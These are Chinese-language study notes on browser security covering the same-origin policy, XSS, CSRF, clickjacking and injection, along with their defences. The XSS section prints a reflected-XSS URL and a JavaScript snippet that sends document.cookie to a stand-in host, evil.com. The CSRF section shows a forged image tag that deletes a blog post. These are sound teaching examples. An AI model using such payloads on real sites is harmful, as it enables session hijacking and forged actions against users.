# 第 2 章 浏览器安全

## 2.1 同源策略

浏览器的同源策略，限制了来自不同源的“document”或脚本，对当前“document”读取或设置某些属性。    

需要注意的是，对于当前页面来说，页面内存放JavaScript文件的域并不重要，重要的是加载
JavaScript页面所在的域是什么。   

换言之，a.com通过以下代码：`<script src="http://b.com/b.jg"></script>` 加载了 b.com
上的 b.js，但是 b.js 是运行在 a.com 页面中的，因此对于当前打开的页面来说，b.js 的 Origin
就应该是 a.com 而非 b.com。   

在浏览器中，&lt;srcipt&gt;, &lt;img&gt;, &lt;iframe&gt;, &lt;link&gt; 等标签都可以
跨域加载资源，而不受同源策略的限制。这些带 src 属性的标签每次加载时，实际上是由浏览器发起了
一次 GET 请求。不同于 XHR 的是，通过 src 属性加载的资源，浏览器限制了 JS 的权限，使其
不能读、写返回的内容。   

# 第 3 章 跨站脚本攻击（XSS)

## 3.1 XSS 简介

跨站脚本攻击，Cross Site Script。   

XSS攻击，通常指黑客通过“HTML注入”篡改了网页，插入了恶意的脚本，从而在用户浏览网页时，
控制用户浏览器的一种攻击。在一开始，这种攻击的演示案例是跨域的，所以叫做“跨站脚本”。
但是发展到今天，由于JavaScript的强大功能以及网站前端应用的复杂化，是否跨域已经不再重要。
但是由于历史原因，XSS这个名字却一直保留下来。    

XSS根据效果的不同可以分成如下几类:   

1. 反射型 XSS。    

反射型XSS只是简单地把用户输入的数据“反射”给浏览器。也就是说，黑客往往需要诱使用户“点击”
一个恶意链接，才能攻击成功。反射型XSS也叫做“非持久型XSS”（Non-persistent XSS）。    

2. 存储型 XSS

存储型XSS会把用户输入的数据“存储”在服务器端。这种XSS具有很强的稳定性。     

比较常见的一个场景就是，黑客写下一篇包含有恶意JavaScript代码的博客文章，文章发表后，所
有访问该博客文章的用户，都会在他们的浏览器中执行这段恶意的JavaScript代码。黑客把恶意的
脚本保存到服务器端，所以这种XSS攻击就叫做“存储型XSS”。    

存储型XSS通常也叫做“持久型XSS”(Per-sistent XSS)，因为从效果上来说，它存在的时间是比较长的。    

3. DOM Based XSS    

实际上，这种类型的XSS并非按照“数据是否保存在服务器端”来划分，DOM Based XSS从效果上来说
也是反射型XSS。单独划分出来，是因为DOM Based XSS的形成原因比较特别，发现它的安全专家专
门提出了这种类型的XSS。出于历史原因，也就把它单独作为一个分类了。    

通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS。   

## 3.2 XSS 攻击进阶

### 3.2.1 初探 XSS Payload

XSS攻击成功后，攻击者能够对用户当前浏览的页面植入恶意脚本，通过恶意脚本，控制用户的
浏览器。这些用以完成各种具体功能的恶意脚本，被称为“XSS Payload”。      

XSS Payload实际上就是JavaScript脚本（还可以是Flash或其他富客户端的脚本），所以任何
JavaScript脚本能实现的功能，XSS Payload都能做到。    

一个最常见的XSS  Payload，就是通过读取浏览器的Cookie对象，从而发起“Cookie劫持”攻击。   

Cookie中一般加密保存了当前用户的登录凭证。Cookie如果丢失，往往意味着用户的登录凭证丢失。
换句话说，攻击者可以不通过密码，而直接登录进用户的账户。    

如下所示，攻击者先加载一个远程脚本:   

```
http://www.a.com/test.html?abc=<script src="http://www.evil.com/evil.js"></script>
```   

真正的XSS Payload写在这个远程脚本中，避免直接在URL的参数里写入大量的JavaScript代码。   

在evil.js中，可以通过如下代码窃取Cookie:   

```js
var img = document.createElement("img");
img.src = "http://www.evil.com/log?" + escape(document.cookie);
document.body.appendChild(img)
```   

这段代码在页面中插入了一张看不见的图片，同时把document.cookie对象作为参数发送到远程服务器。   

等等，能这样做的前提是页面中会将 a 参数的内容显示在页面中，否则脚本是不会执行的。   

Cookie的“HttpOnly”标识可以防止“Cookie劫持”。    

### 3.2.2 强大的 XSS Payload

攻击者除了可以实施“Cookie劫持”外，还能够通过模拟GET、POST请求操作用户的浏览器。   

## 3.3 XSS 的防御

1. HttpOnly
2. 编码特殊字符    

# 第 4 章 跨站点请求伪造（CSRF)

Cross Site Request Forgery。    

## 4.1 CSRF 简介

还记得在“跨站脚本攻击”一章中，介绍XSSPayload时的那个“删除搜狐博客”的例子吗？登录Sohu
博客后，只需要请求这个URL，就能够把编号为“156713012”的博客文章删除：   

```
http://blog.sohu.com/manage/entry.do?m=delete&id=156713012
```   

攻击者首先在自己的域构造一个页面：   

```
http://www.a.com/csrf.html
```   

其内容为：   

```
<img src="http://blog.sohu.com/manage/entry.do?m=delete&id=156713012" />
```    

回顾整个攻击过程，攻击者仅仅诱使用户访问了一个页面，就以该用户身份在第三方站点里执行了一次操作。   

这个删除博客文章的请求，是攻击者所伪造的，所以这种攻击就叫做“跨站点请求伪造”。    

## 4.2 CSRF 进阶

在上节提到的例子里，攻击者伪造的请求之所以能够被搜狐服务器验证通过，是因为用户的浏览器
成功发送了Cookie的缘故。    

在浏览网站的过程中，若是一个网站设置了Session  Cookie，那么在浏览器进程的生命周期内，
即使浏览器新打开了Tab页，Session Cookie也都是有效的。Session  Cookie保存在浏览器进程
的内存空间中。    

## 4.3 CSRF 的防御

1. 验证码。    

CSRF攻击的过程，往往是在用户不知情的情况下构造了网络请求。而验证码，则强制用户必须与
应用进行交互，才能完成最终请求。因此在通常情况下，验证码能够很好地遏制CSRF攻击。   

但是验证码并非万能。很多时候，出于用户体验考虑，网站不能给所有的操作都加上验证码。因此，
验证码只能作为防御CSRF的一种辅助手段，而不能作为最主要的解决方案。    

2. Referer Check。   

即使我们能够通过检查Referer是否合法来判断用户是否被CSRF攻击，也仅仅是满足了防御的充分
条件。Referer Check的缺陷在于，服务器并非什么时候都能取到Referer。很多用户出于隐私
保护的考虑，限制了Referer的发送。在某些情况下，浏览器也不会发送Referer，比如从HTTPS
跳转到HTTP，出于安全的考虑，浏览器也不会发送Referer。    

3. Anti CSRF Token。    

现在业界针对CSRF的防御，一致的做法是使用一个Token。在介绍此方法前，先了解一下CSRF的本质。    

CSRF为什么能够攻击成功？其本质原因是重要操作的所有参数都是可以被攻击者猜测到的。   

攻击者只有预测出URL的所有参数与参数值，才能成功地构造一个伪造的请求；反之，攻击者将无法攻击成功。   

出于这个原因，可以想到一个解决方案：把参数加密，或者使用一些随机数，从而让攻击者无法猜测到参数值。   

比如，一个删除操作的 URL 是：`http://host/path/delete?username=abc&item=123`，把其中
的 username 参数改成哈希值：`http://host/path/delete?username=md5(salt+abc)&item=123`。    

这样，在攻击者不知道salt的情况下，是无法构造出这个URL的，因此也就无从发起CSRF攻击了。
而对于服务器来说，则可以从Session或Cookie中取得“username=abc”的值，再结合salt对整个请求进行验
证，正常请求会被认为是合法的。    

但是这个方法也存在一些问题。首先，加密或混淆后的URL将变得非常难读，对用户非常不友好。
其次，如果加密的参数每次都改变，则某些URL将无法再被用户收藏。最后，普通的参数如果也被加密或哈
希，将会给数据分析工作带来很大的困扰，因为数据分析工作常常需要用到参数的明文。    

回到上面的URL中，保持原参数不变，新增一个参数Token。这个Token的值是随机的，不可预测：   

`http://host/path/delete?username=abc&item=123&token=[random(seed)]`    

Token应该作为一个“秘密”，为用户与服务器所共同持有，不能被第三者知晓。在实际应用时，Token
可以放在用户的Session中，或者浏览器的Cookie中。    

Token需要同时放在表单和Session中。在提交请求时，服务器只需验证表单中的Token，与用户
Session（或Cookie）中的Token是否一致，如果一致，则认为是合法请求；如果不一致，或者有
一个为空，则认为请求不合法，可能发生了CSRF攻击。    

CSRF的Token仅仅用于对抗CSRF攻击，当网站还同时存在XSS漏洞时，这个方案就会变得无效，因为
XSS可以模拟客户端浏览器执行任意操作。在XSS攻击下，攻击者完全可以请求页面后，读出页面内容
里的Token值，然后再构造出一个合法的请求。这个过程可以称之为XSRF，和CSRF以示区分。    

# 第 5 章 点击劫持

## 5.1 什么是点击劫持

点击劫持是一种视觉上的欺骗手段。攻击者使用一个透明的、不可见的iframe，覆盖在一个网页上，
然后诱使用户在该网页上进行操作，此时用户将在不知情的情况下点击透明的iframe页面。通过调整
iframe页面的位置，可以诱使用户恰好点击在iframe页面的一些功能性按钮上。    

## 5.2 防御 ClickJacking

ClickJacking是一种视觉上的欺骗，那么如何防御它呢？针对传统的ClickJacking，一般是通过
禁止跨域的iframe来防范。    

一个比较好的方案是使用一个HTTP头 —— X-Frame-Options。     

除了X-Frame-Options之外，Firefox的“Content Security Policy”以及Firefox的No-Script
扩展也能够有效防御ClickJacking。    

# 第 7 章 注入攻击

注入攻击的本质，是把用户输入的数据当做代码执行。这里有两个关键条件，第一个是用户能够控制输入；
第二个是原本程序要执行的代码，拼接了用户输入的数据。    

